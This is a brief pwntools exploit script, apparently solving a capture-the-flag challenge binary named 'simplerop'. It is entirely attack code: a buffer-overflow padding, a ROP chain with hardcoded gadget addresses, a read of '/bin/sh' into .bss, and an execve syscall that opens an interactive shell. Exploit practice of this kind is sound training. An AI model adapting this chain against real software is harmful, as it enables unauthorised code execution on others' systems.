from pwn import *
 
p = process('./simplerop')
e = ELF('./simplerop')
 
syscall = 0x806eef0
read = 0x806cd50 
 
peax = 0x080bae06
pecx_ebx = 0x0806e851
pedx = 0x0806e82a
pppr = 0x0804838c
 
pay = 'A' * 32
 
pay += p32(read)
pay += p32(pppr)
pay += p32(0) + p32(e.bss()) + p32(8)
 
pay += p32(peax) + p32(0xb)
pay += p32(pecx_ebx) + p32(0) + p32(e.bss())
pay += p32(pedx) + p32(0)
pay += p32(syscall)
 
p.recvuntil(':')
p.send(pay)
p.send('/bin/sh\x00')
 
p.interactive()
